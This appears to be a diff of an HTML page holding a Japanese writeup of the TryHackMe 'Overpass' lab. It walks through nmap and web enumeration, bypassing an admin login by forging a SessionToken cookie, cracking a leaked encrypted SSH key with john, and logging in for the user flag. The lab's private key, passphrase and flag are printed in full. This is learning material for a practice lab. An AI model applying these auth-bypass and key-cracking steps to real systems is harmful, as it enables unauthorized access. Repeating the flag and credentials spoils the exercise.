@@ -4,227 +4,14 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TryHackMe Overpass Writeup</title>
-  <style>
-    :root {
-      --bg: #0c1222;
-      --panel: #121a2f;
-      --panel-soft: #17213a;
-      --text: #ecf2ff;
-      --muted: #a8b3cc;
-      --accent: #46d369;
-      --accent-2: #61dafb;
-      --warn: #f6c177;
-      --code: #080d18;
-      --border: rgba(255, 255, 255, 0.12);
-      --shadow: rgba(0, 0, 0, 0.35);
-    }
-
-    * { box-sizing: border-box; }
-
-    body {
-      margin: 0;
-      font-family: Inter, "Segoe UI", Roboto, Arial, sans-serif;
-      line-height: 1.7;
-      color: var(--text);
-      background:
-        radial-gradient(circle at top left, rgba(70, 211, 105, 0.18), transparent 28rem),
-        radial-gradient(circle at top right, rgba(97, 218, 251, 0.14), transparent 26rem),
-        var(--bg);
-    }
-
-    a { color: var(--accent-2); }
-
-    .nav-top {
-      padding: 0.75rem 1.25rem;
-      border-bottom: 1px solid var(--border);
-      background: rgba(18, 26, 47, 0.65);
-    }
-
-    .nav-top a {
-      font-size: 0.95rem;
-    }
-
-    .hero {
-      padding: 3rem 1.25rem 2.5rem;
-      text-align: center;
-      border-bottom: 1px solid var(--border);
-    }
-
-    .hero h1 {
-      margin: 0;
-      font-size: clamp(2.2rem, 8vw, 4.5rem);
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
-    }
-
-    .hero p {
-      max-width: 760px;
-      margin: 1rem auto 0;
-      color: var(--muted);
-      font-size: 1.05rem;
-    }
-
-    .badges {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 0.75rem;
-      margin-top: 1.5rem;
-    }
-
-    .badge {
-      padding: 0.4rem 0.8rem;
-      border: 1px solid var(--border);
-      border-radius: 999px;
-      color: var(--text);
-      background: rgba(255, 255, 255, 0.06);
-      font-size: 0.9rem;
-    }
-
-    main {
-      width: min(1120px, calc(100% - 2rem));
-      margin: 0 auto;
-      padding: 2rem 0 4rem;
-    }
-
-    .notice,
-    .card,
-    .timeline-item,
-    .answers {
-      border: 1px solid var(--border);
-      border-radius: 18px;
-      background: rgba(18, 26, 47, 0.82);
-      box-shadow: 0 18px 50px var(--shadow);
-    }
-
-    .notice {
-      padding: 1rem 1.25rem;
-      margin-bottom: 1.5rem;
-      border-left: 4px solid var(--warn);
-    }
-
-    .notice strong { color: var(--warn); }
-
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
-      gap: 1rem;
-      margin: 1.5rem 0 2rem;
-    }
-
-    .card { padding: 1.25rem; }
-    .card h3 { margin: 0 0 0.5rem; color: var(--accent); }
-    .card p, .timeline-item p, .answers p { color: var(--muted); }
-
-    section { margin-top: 2rem; }
-    h2 { margin: 0 0 1rem; font-size: 1.8rem; }
-
-    .timeline { display: grid; gap: 1rem; }
-
-    .timeline-item {
-      padding: 1.35rem;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .timeline-item::before {
-      content: attr(data-step);
-      position: absolute;
-      top: 1rem;
-      right: 1rem;
-      color: rgba(255, 255, 255, 0.08);
-      font-weight: 800;
-      font-size: 3rem;
-      line-height: 1;
-    }
-
-    .timeline-item h3 {
-      margin: 0 0 0.75rem;
-      color: var(--accent);
-      padding-right: 4rem;
-    }
-
-    .writeup-img {
-      display: block;
-      max-width: 100%;
-      margin: 1rem 0;
-      border-radius: 12px;
-      border: 1px solid var(--border);
-    }
-
-    pre {
-      margin: 1rem 0;
-      padding: 1rem;
-      overflow-x: auto;
-      border-radius: 12px;
-      border: 1px solid var(--border);
-      background: var(--code);
-    }
-
-    code {
-      font-family: "Cascadia Code", "Fira Code", Consolas, monospace;
-      color: #d7e4ff;
-      font-size: 0.92rem;
-    }
-
-    .inline-code {
-      padding: 0.15rem 0.35rem;
-      border-radius: 6px;
-      background: rgba(255, 255, 255, 0.08);
-      color: var(--text);
-      font-family: Consolas, monospace;
-    }
-
-    ul { color: var(--muted); padding-left: 1.25rem; }
-    ul li { margin: 0.35rem 0; }
-
-    .answers {
-      padding: 1.35rem;
-      background: linear-gradient(135deg, rgba(70, 211, 105, 0.12), rgba(18, 26, 47, 0.86));
-    }
-
-    .answers table {
-      width: 100%;
-      border-collapse: collapse;
-      overflow: hidden;
-      border-radius: 12px;
-    }
-
-    .answers th,
-    .answers td {
-      padding: 0.9rem;
-      text-align: left;
-      border-bottom: 1px solid var(--border);
-      vertical-align: top;
-    }
-
-    .answers th {
-      color: var(--accent);
-      background: rgba(255, 255, 255, 0.04);
-    }
-
-    footer {
-      padding: 2rem 1rem;
-      color: var(--muted);
-      text-align: center;
-      border-top: 1px solid var(--border);
-    }
-
-    @media (max-width: 820px) {
-      .grid { grid-template-columns: 1fr; }
-      .answers { overflow-x: auto; }
-    }
-  </style>
+  <link rel="stylesheet" href="assets/writeup.css">
 </head>
 <body>
   <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
 
   <header class="hero">
     <h1>Overpass</h1>
-    <p>
-      TryHackMe の Easy ルーム。Web 列挙、クライアントサイド認証のバイパス、
-      SSH 鍵クラック、cron ジョブ悪用による権限昇格を扱う日本語 writeup です。
-    </p>
+    <p>Obsidian ノート原文 — 要約・編集なし</p>
     <div class="badges">
       <span class="badge">Platform: TryHackMe</span>
       <span class="badge">Difficulty: Easy</span>
@@ -235,187 +22,481 @@
 
   <main>
     <div class="notice">
-      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれます。
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
       許可されたラボ環境での学習目的でのみご利用ください。
     </div>
-
-    <section class="grid">
-      <article class="card">
-        <h3>Web 列挙</h3>
-        <p>HTTP サービスの調査、About Us からのユーザー名収集、ダウンロードページの解析。</p>
-      </article>
-      <article class="card">
-        <h3>認証バイパス</h3>
-        <p><span class="inline-code">login.js</span> の解析から、SessionToken クッキーによる管理画面アクセス。</p>
-      </article>
-      <article class="card">
-        <h3>権限昇格</h3>
-        <p>書き込み可能な <span class="inline-code">/etc/hosts</span> と root の cron ジョブを悪用。</p>
-      </article>
-    </section>
-
-    <section>
-      <h2>Walkthrough</h2>
-      <div class="timeline">
-
-        <article class="timeline-item" data-step="01">
-          <h3>初期スキャンと Web 調査</h3>
-          <p>まず nmap でポート 22 (SSH) と 80 (HTTP) が開いていることを確認。</p>
-          <pre><code>nmap &lt;target-ip&gt;
-
+    
+    <article class="writeup-body">
+      <pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.49.131.245                                             
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 11:50 +0900
+Nmap scan report for 10.49.131.245
+Host is up (0.13s latency).
+Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE
 22/tcp open  ssh
-80/tcp open  http</code></pre>
-          <p>HTTP にアクセスすると、パスワードマネージャー Overpass のサイトが表示される。</p>
-          <img class="writeup-img" src="overpass/images/01-homepage.png" alt="Overpass homepage">
-          <p>About Us ページからユーザー名候補を収集: <span class="inline-code">Ninja</span>, <span class="inline-code">Pars</span>, <span class="inline-code">Szymex</span>, <span class="inline-code">Bee</span>, <span class="inline-code">MuirlandOracle</span></p>
-          <img class="writeup-img" src="overpass/images/02-about-us.png" alt="About Us page">
-          <p><span class="inline-code">/downloads</span> からバイナリとソースをすべてダウンロード。</p>
-          <img class="writeup-img" src="overpass/images/03-downloads.png" alt="Downloads page">
-        </article>
+80/tcp open  http
 
-        <article class="timeline-item" data-step="02">
-          <h3>管理画面の発見</h3>
-          <p>feroxbuster の結果から <span class="inline-code">/admin</span> を発見し、ログイン画面に到達。</p>
-          <img class="writeup-img" src="overpass/images/04-admin-login.png" alt="Admin login page">
-          <p>ログインフォームに出会ったときのチェック項目（優先度順）:</p>
-          <p><strong>優先度 高</strong></p>
-          <ul>
-            <li>デフォルト認証情報の試行（admin:admin など）</li>
-            <li>HTML ソースの確認（コメント、隠しフィールド、参照 JS）</li>
-            <li>auth/login/session 系 JS ファイルの読解</li>
-            <li>ログインリクエスト/レスポンスの観察（Burp, DevTools）</li>
-          </ul>
-          <p><strong>優先度 中</strong></p>
-          <ul>
-            <li>SQLi / NoSQLi / 認証バイパスペイロード</li>
-            <li><span class="inline-code">/api/login</span> などのエンドポイントを直接叩く</li>
-            <li>エラーメッセージによるユーザー名列挙</li>
-          </ul>
-          <p><strong>優先度 低</strong></p>
-          <ul>
-            <li>パスワードリセット機能の解析</li>
-            <li>総当たり</li>
-          </ul>
-        </article>
-
-        <article class="timeline-item" data-step="03">
-          <h3>login.js の解析</h3>
-          <p>F12 で HTML ソースを確認。<span class="inline-code">login.js</span> と <span class="inline-code">cookie.js</span> が読み込まれている。</p>
-          <p>ログイン処理の核心部分:</p>
-          <pre><code>async function login() {
+Nmap done: 1 IP address (1 host up) scanned in 2.96 seconds
+</code></pre>
+<p>httpにアクセスしてみる<br>
+<img alt="Pasted image 20260528115843" src="overpass/images/01-Pasted-image-20260528115843.png"><br>
+パスワードマネージャーを配っている<br>
+About Usを見てみる<br>
+<img alt="Pasted image 20260528115932" src="overpass/images/02-Pasted-image-20260528115932.png"><br>
+<code>Ninja</code>,<code>Pars</code>,<code>Szymex</code>,<code>Bee</code>,<code>MuirlandOracle</code>の5つがusernameの候補</p>
+<p>つづいて<code>/downloads</code>のページを見る<br>
+<img alt="Pasted image 20260528130953" src="overpass/images/03-Pasted-image-20260528130953.png"><br>
+いったん全部DLする</p>
+<hr>
+<p>迷子になって次の日になった</p>
+<p>feroxの結果に<code>/admin</code>があったのでアクセスしたところ<br>
+<img alt="Pasted image 20260529091918" src="overpass/images/04-Pasted-image-20260529091918.png"><br>
+ログイン画面に到達した</p>
+<p>答えを見たところクッキーをいじるらしかった<br>
+ただ再現性に疑問を感じたためAIに質問をした</p>
+<hr>
+<p>ログインフォームに出会ったときのチェック項目とその優先度について</p>
+<p>優先度　高<br>
+デフォルト認証情報の試行（admin:admin, guest:guestなど）<br>
+HTMLソースの確認（コメント、隠しフィールド、参照ファイル一覧）<br>
+参照されているJSファイルを読む（特にauth/login/session系の命名）<br>
+ログインリクエスト/レスポンスの観察（Burp, DevToolsNetwork）。ステータス、Set-Cookie</p>
+<p>優先度　中<br>
+SQLi、NoSQLi、認証バイパスペイロード<br>
+<code>/api/login</code>などのエンドポイントを直接叩く<br>
+エラーメッセージによるユーザー名列挙</p>
+<p>優先度　低<br>
+パスワードリセット機能の解析<br>
+総当たり</p>
+<hr>
+<p>ということなので勇気を出してF12する</p>
+<pre><code class="language-html">|   |
+|---|
+|&lt;!DOCTYPE html&gt;|
+|&lt;html&gt;|
+||
+|&lt;head&gt;|
+|&lt;meta charset=&quot;utf-8&quot;&gt;|
+|&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;|
+|&lt;title&gt;Overpass&lt;/title&gt;|
+|&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;|
+|&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;[/css/main.css](http://10.49.140.13/css/main.css)&quot;&gt;|
+|&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;[/css/login.css](http://10.49.140.13/css/login.css)&quot;&gt;|
+|&lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; href=&quot;[/img/overpass.png](http://10.49.140.13/img/overpass.png)&quot; /&gt;|
+|&lt;script src=&quot;[/main.js](http://10.49.140.13/main.js)&quot;&gt;&lt;/script&gt;|
+|&lt;script src=&quot;[/login.js](http://10.49.140.13/login.js)&quot;&gt;&lt;/script&gt;|
+|&lt;script src=&quot;[/cookie.js](http://10.49.140.13/cookie.js)&quot;&gt;&lt;/script&gt;|
+|&lt;/head&gt;|
+||
+|&lt;body onload=&quot;onLoad()&quot;&gt;|
+|&lt;nav&gt;|
+|&lt;img class=&quot;logo&quot; src=&quot;[/img/overpass.svg](http://10.49.140.13/img/overpass.svg)&quot; alt=&quot;Overpass logo&quot;&gt;|
+|&lt;h2 class=&quot;navTitle&quot;&gt;&lt;a href=&quot;[/](http://10.49.140.13/)&quot;&gt;Overpass&lt;/a&gt;&lt;/h2&gt;|
+|&lt;a class=&quot;current&quot; href=&quot;[/aboutus](http://10.49.140.13/aboutus)&quot;&gt;About Us&lt;/a&gt;|
+|&lt;a href=&quot;[/downloads](http://10.49.140.13/downloads)&quot;&gt;Downloads&lt;/a&gt;|
+|&lt;/nav&gt;|
+|&lt;div class=&quot;content&quot;&gt;|
+|&lt;h1&gt;Administrator area&lt;/h1&gt;|
+|&lt;p&gt;Please log in to access this content&lt;/p&gt;|
+|&lt;div&gt;|
+|&lt;h3 class=&quot;formTitle&quot;&gt;Overpass administrator login&lt;/h1&gt;|
+|&lt;/div&gt;|
+|&lt;form id=&quot;loginForm&quot;&gt;|
+|&lt;div class=&quot;formElem&quot;&gt;&lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;&lt;input id=&quot;username&quot; name=&quot;username&quot; required&gt;&lt;/div&gt;|
+|&lt;div class=&quot;formElem&quot;&gt;&lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;&lt;input id=&quot;password&quot; name=&quot;password&quot;|
+|type=&quot;password&quot; required&gt;&lt;/div&gt;|
+|&lt;button&gt;Login&lt;/button&gt;|
+|&lt;/form&gt;|
+|&lt;div id=&quot;loginStatus&quot;&gt;&lt;/div&gt;|
+|&lt;/div&gt;|
+|&lt;/body&gt;|
+||
+|&lt;/html&gt;|
+</code></pre>
+<p><code>login.js</code>があるので読む<br>
+きっとログインまわりの動き方が分析できるはず</p>
+<pre><code class="language-js">async function postData(url = '', data = {}) {
+    // Default options are marked with *
+    const response = await fetch(url, {
+        method: 'POST', // *GET, POST, PUT, DELETE, etc.
+        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+        credentials: 'same-origin', // include, *same-origin, omit
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        redirect: 'follow', // manual, *follow, error
+        referrerPolicy: 'no-referrer', // no-referrer, *client
+        body: encodeFormData(data) // body data type must match &quot;Content-Type&quot; header
+    });
+    return response; // We don't always want JSON back
+}
+const encodeFormData = (data) =&gt; {
+    return Object.keys(data)
+        .map(key =&gt; encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
+        .join('&amp;');
+}
+function onLoad() {
+    document.querySelector(&quot;#loginForm&quot;).addEventListener(&quot;submit&quot;, function (event) {
+        //on pressing enter
+        event.preventDefault()
+        login()
+    });
+}
+async function login() {
+    const usernameBox = document.querySelector(&quot;#username&quot;);
+    const passwordBox = document.querySelector(&quot;#password&quot;);
+    const loginStatus = document.querySelector(&quot;#loginStatus&quot;);
+    loginStatus.textContent = &quot;&quot;
     const creds = { username: usernameBox.value, password: passwordBox.value }
-    const response = await postData("/api/login", creds)
+    const response = await postData(&quot;/api/login&quot;, creds)
     const statusOrCookie = await response.text()
-    if (statusOrCookie === "Incorrect credentials") {
-        loginStatus.textContent = "Incorrect Credentials"
-        passwordBox.value=""
+    if (statusOrCookie === &quot;Incorrect credentials&quot;) {
+        loginStatus.textContent = &quot;Incorrect Credentials&quot;
+        passwordBox.value=&quot;&quot;
     } else {
-        Cookies.set("SessionToken", statusOrCookie)
-        window.location = "/admin"
+        Cookies.set(&quot;SessionToken&quot;,statusOrCookie)
+        window.location = &quot;/admin&quot;
     }
-}</code></pre>
-          <p><span class="inline-code">response.text()</span> の戻り値が <span class="inline-code">"Incorrect credentials"</span> でなければ成功扱い。成功時はレスポンス本文をそのまま SessionToken クッキーにセットして <span class="inline-code">/admin</span> へ遷移する。</p>
-          <p>curl で API を直接叩いて確認:</p>
-          <pre><code>curl -i -X POST http://&lt;target-ip&gt;/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"james","password":"wrong"}'
-
+}
+</code></pre>
+<p>後半の<code>async function login()</code>で<br>
+<code>const statusOrCookie = await response.text()</code>としている<br>
+この<code>response.text()</code>というのはfetchして返ってくる本文（body）である</p>
+<p><code>const responce = await postData("/api/login", creds)</code>とあることから<br>
+<code>creds</code>つまり<code>const creds = { username: usernameBox.value, password: passwordBox.value }</code>を<br>
+<code>/api/login</code>に投げていることがわかる</p>
+<p>なのでそれをcurlでやろうとすると<br>
+<code>curl -i -X POST http://10.49.140.13/api/login -H "Content-Type: application/json" -d '{"username":"test","password":"wrong"}'</code><br>
+を投げればよい<br>
+<code>-i</code>はレスポンスヘッダと本文をどちらも表示させるオプション<br>
+<code>-I</code>とすればヘッダのみとなる<br>
+<code>-X POST</code>でメソッド指定をしている。</p>
+<p><code>-H</code>は送るデータの形式を指定している。これはとっても重要。curlはデフォルトでは<code>application/x-www-form-urlencoded</code>を指定する。<br>
+その場合には<code>curl -i -X POST http://example.com/api/login -d 'username=admin&amp;password=wrong'</code>とすればよい<br>
+けど毎回この形式が通るとは限らないから今回はJSON形式を指定して<code>-d</code>でJSONデータを入れている</p>
+<p>そして投げると以下が返ってきた</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ curl -i -X POST http://10.49.140.13/api/login \
+  -H &quot;Content-Type: application/json&quot; \     
+  -d '{&quot;username&quot;:&quot;james&quot;,&quot;password&quot;:&quot;wrong&quot;}'
 HTTP/1.1 400 Bad Request
-...
-Incorrect credentials</code></pre>
-          <p>「失敗メッセージ以外なら成功」という否定条件に違和感を持てば、クッキーを直接セットする解法にたどり着ける。</p>
-        </article>
+Date: Fri, 29 May 2026 00:52:38 GMT
+Content-Length: 21
+Content-Type: text/plain; charset=utf-8
 
-        <article class="timeline-item" data-step="04">
-          <h3>SessionToken クッキーによるバイパス</h3>
-          <p>DevTools → Application → Storage → Cookies でクッキーを確認。空の状態から手動でクッキーを作成する。</p>
-          <img class="writeup-img" src="overpass/images/05-cookies-empty.png" alt="Empty cookies panel">
-          <p>テスト用に <span class="inline-code">aaaa</span> という名前のクッキーを作成しても F5 後に変化なし。</p>
-          <img class="writeup-img" src="overpass/images/06-cookie-aaaa.png" alt="Test cookie aaaa">
-          <img class="writeup-img" src="overpass/images/07-cookie-sessiontoken-created.png" alt="SessionToken cookie created">
-          <p><span class="inline-code">SessionToken</span> という名前のクッキーを作成して F5 すると、管理画面が表示される。URL は <span class="inline-code">/admin</span> のままで、クッキーの有無で表示が変わることを確認。</p>
-          <img class="writeup-img" src="overpass/images/08-admin-panel.png" alt="Admin panel after cookie bypass">
-          <p>管理画面から <span class="inline-code">james</span> ユーザー名と暗号化された SSH 秘密鍵を取得。</p>
-        </article>
+Incorrect credentials  
+</code></pre>
+<p>この<code>Incorrect credentials</code>が本文であり<code>login.js</code>の中で<code>const statusOrCookie = await response.text()</code>に格納される文字列だ<br>
+そしてそれが<code>if (statusOrCookie === "Incorrect credentials")</code>という条件分岐で使われる<br>
+この文字列完全一致でなければ成功という、謎に否定の条件をとっている<br>
+ここに違和感を感じれるとよいらしい</p>
+<p>elseの部分を見てみる。つまり失敗じゃなかった場合の動きだ。<br>
+まず1行目は<code>Cookies.set("SessionToken",statusOrCookie)</code>でこれはクッキーをセットしている<br>
+２行目は<code>window.location = "/admin"</code>でこれは<code>/admin</code>に移動している</p>
+<p>ここで要る知識が「同じURLでもクッキーの有無などによって表示されるページが違う」だ<br>
+上記のIF文をみるとこの2行だけで「成功」という扱いとしており、逆に言うとこれだけで成功ページにアクセスできるとも取れる</p>
+<p>という論理から「じゃあ、クッキー用意すればログイン試行いらないんじゃね」と考えつくのが今回のスマートな解法である。</p>
+<p>実際にその手順を考える</p>
+<pre><code class="language-bash">else {
+        Cookies.set(&quot;SessionToken&quot;,statusOrCookie)
+        window.location = &quot;/admin&quot;
+    }
+</code></pre>
+<p>ここで考えることが「<code>SessionToken</code>という名前ならその中身を見ずに格納してないか？」ということである</p>
+<p>まずはログインページにてF12をする<br>
+<img alt="Pasted image 20260529112219" src="overpass/images/05-Pasted-image-20260529112219.png"></p>
+<p>Application -&gt; Storage -&gt; Cookies と巡ってこのページのクッキー情報が確認できる<br>
+現在はなにも登録されていない<br>
+名前の部分をダブルクリックしてクッキーを新規作成してみる<br>
+<img alt="Pasted image 20260529112413" src="overpass/images/06-Pasted-image-20260529112413.png"><br>
+aaaaという名前のクッキーを作った<br>
+この状態でF5をしても特に変化はない</p>
+<p><img alt="Pasted image 20260529112459" src="overpass/images/07-Pasted-image-20260529112459.png"><br>
+つづいてSessionTokenという名前のクッキーを作った<br>
+<img alt="Pasted image 20260529112528" src="overpass/images/08-Pasted-image-20260529112528.png"><br>
+この状態でF5をすると見事新しい画面を表示することに成功した<br>
+URLは依然として<code>/admin</code>であり、クッキー情報によって異なる画面が表示されることが確認できた</p>
+<p><code>james</code>というユーザー名とそのSSH鍵がある</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ cat james.key                                  
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
 
-        <article class="timeline-item" data-step="05">
-          <h3>SSH 鍵のクラックと user flag</h3>
-          <p>秘密鍵を <span class="inline-code">james.key</span> として保存し、パーミッションを設定。</p>
-          <pre><code>chmod 400 james.key
-ssh -i james.key james@&lt;target-ip&gt;</code></pre>
-          <p>パスフレーズを求められる。鍵は AES-128-CBC で暗号化されており、ソルトは鍵ファイル内の <span class="inline-code">DEK-Info</span> 行に記載されている。</p>
-          <pre><code>ssh2john james.key &gt; james.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt james.hash
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
 
-james13          (james.key)</code></pre>
-          <p>パスフレーズ <span class="inline-code">james13</span> で SSH ログイン成功。</p>
-          <pre><code>james@&lt;target&gt;:~$ cat user.txt
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ 
+</code></pre>
+<p><code>james.key</code>という名前で保存し<br>
+<code>chmod 400 james.key</code>をして所有ユーザーだけが読み取りできるようにする</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ ll
+合計 13216
+-rw-rw-r-- 1 rkametani rkametani    2461  5月 29 09:05 james.hash
+-r-------- 1 rkametani rkametani    1766  5月 29 09:03 james.key
+-rw-rw-r-- 1 rkametani rkametani    5094  5月 28 13:11 overpass.go
+-rw-rw-r-- 1 rkametani rkametani 2708791  5月 28 13:11 overpassFreeBSD
+-rwxrwxr-x 1 rkametani rkametani 2722020  5月 28 13:11 overpassLinux
+-rw-rw-r-- 1 rkametani rkametani 2692664  5月 28 13:11 overpassMacOS
+-rw-rw-r-- 1 rkametani rkametani 2704465  5月 28 13:22 overpassOpenBSD
+-rw-rw-r-- 1 rkametani rkametani 2674688  5月 28 13:11 overpassWindows.exe
+-rw-rw-r-- 1 rkametani rkametani      37  5月 28 13:06 username.txt
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ 
+
+</code></pre>
+<p>これを使ってsshログインしようとしたところパスフレーズを求められた</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ ssh -i james.key james@10.49.180.59
+The authenticity of host '10.49.180.59 (10.49.180.59)' can't be established.
+ED25519 key fingerprint is: SHA256:Os+cANqWVUosu3PfRjyDv7+O98oSqn0+sWc3owXPDmA
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.49.180.59' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase for key 'james.key': 
+</code></pre>
+<p>まずこの時点では秘密鍵は向こうにまだ送られていない<br>
+認証鍵はまだ暗号化されたままなので手元で復号してからサーバに送るのがSSH鍵認証だ<br>
+なのでその復号のためにパスフレーズがいる</p>
+<p>パスフレーズだけでは秘密鍵を暗号化することができない<br>
+暗号化するには１２８ビットの鍵が必要だ<br>
+そこで、パスフレーズとソルト合体させたものををmd5して128ビットにする<br>
+このソルトは<code>james.key</code>に記載されている<br>
+そしてできあがった１２８ビットの鍵で暗号化したものが<code>james.key</code>である</p>
+<p>なのでパスフレーズが分かれば同様の手順を踏んで１２８ビットの鍵が作成でき<br>
+暗号化されている秘密鍵を復号化できるというわけ</p>
+<p>そこで<code>ssh2john</code>を使う<br>
+SSH秘密鍵を<code>john</code>で解析できる形にする<br>
+<code>james.key</code>にはSSH秘密鍵がbase64で格納されており<br>
+<code>ssh2john</code>で仮に<code>james.hash</code>が作成されたとした場合、そこにはSSH秘密鍵が16進数で格納されている。ソルトも格納されている。johnで使える形式に変換して格納されている</p>
+<p>あとはそれをrockyouなど使ってクラックすればよい</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt james.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+james13          (james.key)     
+1g 0:00:00:00 DONE (2026-05-29 11:53) 20.00g/s 267520p/s 267520c/s 267520C/s pink25..honolulu
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ 
+
+</code></pre>
+<p><code>james13</code>が得られた！</p>
+<p>これで再度sshログインする</p>
+<pre><code class="language-bash">james@ip-10-49-180-59:~$ whoami
+james
+james@ip-10-49-180-59:~$ 
+</code></pre>
+<p>せいこう！</p>
+<pre><code class="language-bash">james@ip-10-49-180-59:~$ ls
+todo.txt  user.txt
+james@ip-10-49-180-59:~$ cat user.txt 
 thm{65c1aaf000506e56996822c6281e6bf7}
-
-james@&lt;target&gt;:~$ cat todo.txt
+james@ip-10-49-180-59:~$ cat todo.txt 
 To Do:
-&gt; Update Overpass' Encryption, Muirland has been complaining...
-&gt; Write down my password somewhere on a sticky note...
-&gt; Ask Paradox how he got the automated build script working...</code></pre>
